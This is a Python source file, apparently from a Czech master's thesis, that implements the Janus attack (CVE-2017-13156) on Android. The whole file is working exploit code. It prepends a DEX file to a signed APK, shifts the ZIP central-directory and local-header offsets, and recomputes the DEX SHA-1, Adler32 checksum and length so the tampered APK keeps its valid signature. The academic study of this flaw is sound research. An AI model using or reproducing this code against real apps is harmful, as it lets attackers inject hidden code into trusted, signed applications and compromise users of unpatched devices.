# Tento kod je soucast diplomove prace "Vyuziti zranitelnosti Janus na operacnim systemu Android"
# Autor: Bc. Vit Soucek (soucevi1@fit.cvut.cz)
#
# Pouzite zdroje:
#     - Proof-of-concept vyuziti zranitelnosti Janus:
#         autor: V-E-O
#         dostupne z: https://github.com/V-E-O/PoC/tree/master/CVE-2017-13156
#         Prevzata hlavni myslenka a postup tohoto zdroje. Zdroj neni citovan na konkretnich mistech v kodu,
#         nebot temer cely kod byl pro potreby teto prace upraven a prepsan
#
#     - Specifikace formatu souboru PKZip:
#         autor: Florian Buchholz (buchhofp@jmu.edu)
#         dostupne z: https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html
#         V komentarich v kodu referovana pouze jako "documentation".


import struct
import hashlib
from zlib import adler32


class Janus:
    """
    Class realizing the attack itself. It provides
    the means to update the offset values in the original APK,
    to prepend the DEX to the APK file and to update the
    fields containing the checksum and length of the file.
    """

    def __init__(self, apk, dex):
        """
        An object of this class contains the data of
        the APK file and the data of the DEX file.

        :param apk: Object containing the APK file data
        :param dex: Object containing the DEX file data
        :type apk: apk.Apk
        :type dex: dex.Dex
        """
        self.apk = apk
        self.dex = dex

    def update_offsets(self):
        """
        The DEX file gets prepended to the APK file.
        The APK headers contain offsets relative to the start
        of the file. They must be all updated to be valid after
        the DEX is merged with the APK.

        The offsets are:
            - start of the central directory (written in the 'End of Central Directory' section)
            - local header offsets (written in each file header contained within the APK/PKZip)
        """
        new_cd_start = self.apk.cd_start + self.dex.length
        self.update_cd_start(new_cd_start)

        print(f'Start of the Central Directory offset updated: {self.apk.cd_start} ---> {new_cd_start}')

        current_fh = self.apk.cd_start
        while current_fh < self.apk.cd_end:
            lh_offset = self.apk.get_local_header(current_fh)
            new_lh_offset = lh_offset + self.dex.length
            self.update_local_header(new_lh_offset, current_fh)
            current_fh = self.apk.get_next_file_header(current_fh + 46, self.apk.cd_end)
            if current_fh == -1:
                break
        print(f'Updated local header offsets')

    def update_cd_start(self, new_offset):
        """
        Update the offset of the start of the APK Central Directory. Write the result
        to the offset specified by the documentation (End Of Central Directory + 16).

        :param new_offset: New offset of the start of the Central Directory
        :type new_offset: long
        """
        self.apk.data[self.apk.cd_end + 16:self.apk.cd_end + 20] = struct.pack("<L", new_offset)

    def update_local_header(self, new_offset, cd_file_header_offset):
        """
        Update the offsets of the APK Central Directory local header. Write the result to the
        offset of specified by the documentation (Central Directory File Header + 42).

        :param new_offset: New offset of the Local Header
        :param cd_file_header_offset: Offset of the current Central Directory File Header
        :type new_offset: long
        :type cd_file_header_offset: long
        """
        self.apk.data[cd_file_header_offset + 42:cd_file_header_offset + 46] = struct.pack("<L", new_offset)

    def join_the_files(self):
        """
        Prepend the DEX file data to the APK file data,
        update the length written in the file header and
        also the checksum of the file.

        :return: Data of the two files merged, with correct length and checksum
        :rtype: bytearray
        """
        out_data = self.dex.data + self.apk.data
        print(f'Updating data length to {len(out_data)}')
        self.update_data_length(out_data)
        print(f'Updating checksum')
        self.update_checksum(out_data)
        return out_data

    @staticmethod
    def update_checksum(data):
        """
        Update the checksum of the modified APK file.

        :param data: Data of the modified APK file
        :type data: bytearray
        """
        m = hashlib.sha1()
        m.update(data[32:])

        # Patch SHA1 inside the prepended DEX
        data[12:12 + 20] = m.digest()

        # Calculate checksum of the data except for
        # the DEX header and the 'Adler32' section
        v = adler32(memoryview(data[12:])) & 0xffffffff

        # Write the new checksum to the APK data
        data[8:12] = struct.pack("<L", v)

    @staticmethod
    def update_data_length(data):
        """
        Update the length section (specified in the documentation)
        of the modified data with the correct length.

        :param data: Data with incorrect length
        :type data: bytearray
        """
        data[32:36] = struct.pack("<L", len(data))
